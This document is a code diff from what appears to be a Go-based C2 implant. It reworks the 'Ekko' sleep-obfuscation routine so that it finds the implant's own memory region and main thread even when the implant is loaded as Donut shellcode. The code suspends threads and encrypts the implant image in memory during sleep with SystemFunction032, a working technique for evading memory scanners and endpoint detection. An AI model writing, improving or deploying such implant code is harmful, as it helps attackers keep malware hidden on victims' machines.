@@ -29,7 +29,6 @@ var (
 	procSignalObjectAndWait   = kernel32dll.NewProc("SignalObjectAndWait")
 	procNtResumeProcess       = ntdll.NewProc("NtResumeProcess")
 	procGetThreadContext      = kernel32dll.NewProc("GetThreadContext")
-	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
 	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
 	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
 	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
@@ -50,7 +49,26 @@ var (
 	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
 )
 
+// Where the implant is loaded and which thread is Go's main thread, found once
+// at startup. This avoids GetModuleHandle(NULL), which returns the host EXE when
+// the implant is shellcode, and reads no PE headers, which Donut wipes.
+var (
+	implantBase, implantSize uintptr
+	implantErr               error
+	mainTID                  uint32 // Go runs package init on its main thread
+)
+
+func init() {
+	mainTID = windows.GetCurrentThreadId()
+	// mainTID is a global, so its address is inside the implant image wherever it was loaded.
+	implantBase, implantSize, implantErr = implantImage(uintptr(unsafe.Pointer(&mainTID)))
+}
+
 func EkkoSleep(sleepTime uint64) error {
+
+	if implantErr != nil {
+		return implantErr
+	}
 
 	// Pin the goroutine to the current OS thread for the entire duration of
 	// the sleep. Without this, the Go scheduler can migrate the goroutine to
@@ -83,11 +101,6 @@ func EkkoSleep(sleepTime uint64) error {
 
 	var peers []windows.Handle
 
-	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
-	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
-	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
-	ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)
-
 	for {
 		if te32.OwnerProcessID == currentProcessID && te32.ThreadID != currentTID {
 			hThread, openErr := windows.OpenThread(threadAccess, false, te32.ThreadID)
@@ -101,7 +114,10 @@ func EkkoSleep(sleepTime uint64) error {
 					uintptr(unsafe.Pointer(&size)),
 				)
 
-				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
+				// Threads that start inside the implant, plus Go's main thread: under
+				// Donut it starts in Donut's loader, outside the implant. One OR in one
+				// pass, so no thread is listed (and suspended) twice.
+				if (dwStartAddress >= implantBase && dwStartAddress < implantBase+implantSize) || te32.ThreadID == mainTID {
 					peers = append(peers, hThread) // stays open; the chain suspends it
 				} else {
 					windows.CloseHandle(hThread)
@@ -133,12 +149,8 @@ type chainTail struct {
 
 func ekko(sleepTime uint64, peers []windows.Handle) error {
 
-	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
-	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
-	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
-
 	// Snapshot the image's page protections now, so the chain can put back exactly these.
-	regions, err := imageRegions(ImageBase, uintptr(nt_header.OptionalHeader.SizeOfImage))
+	regions, err := imageRegions(implantBase, implantSize)
 	if err != nil {
 		return err
 	}
@@ -166,8 +178,8 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	t.Key.Buffer = &t.KeyBuf[0]
 	t.Key.Length = uint32(len(t.KeyBuf))
 
-	t.Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
-	t.Img.Length = nt_header.OptionalHeader.SizeOfImage
+	t.Img.Buffer = (*byte)(unsafe.Pointer(implantBase))
+	t.Img.Length = uint32(implantSize)
 
 	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
 	var hNewTimer, hTimerQueue uintptr
@@ -193,7 +205,7 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	pKey := uint64(uintptr(unsafe.Pointer(&t.Key)))
 	pOld := uint64(uintptr(unsafe.Pointer(&t.OldProt)))
 	pScratch := uint64(uintptr(unsafe.Pointer(scratch)))
-	imgBase := uint64(ImageBase)
+	imgBase := uint64(implantBase)
 	imgSize := uint64(t.Img.Length)
 	self := uint64(windows.CurrentProcess())
 
@@ -269,4 +281,20 @@ func imageRegions(imageBase, imageSize uintptr) ([]region, error) {
 		addr = next
 	}
 	return out, nil
+}
+
+// implantImage returns the memory allocation that contains addr: the module
+// for an EXE, or the buffer Donut mapped the implant into. It walks regions
+// while they belong to the same allocation, so it needs no PE headers.
+func implantImage(addr uintptr) (base, size uintptr, err error) {
+	var mbi windows.MemoryBasicInformation
+	if err = windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi)); err != nil {
+		return 0, 0, err
+	}
+	base = mbi.AllocationBase
+	end := base
+	for windows.VirtualQuery(end, &mbi, unsafe.Sizeof(mbi)) == nil && mbi.AllocationBase == base {
+		end += mbi.RegionSize
+	}
+	return base, end - base, nil
 }
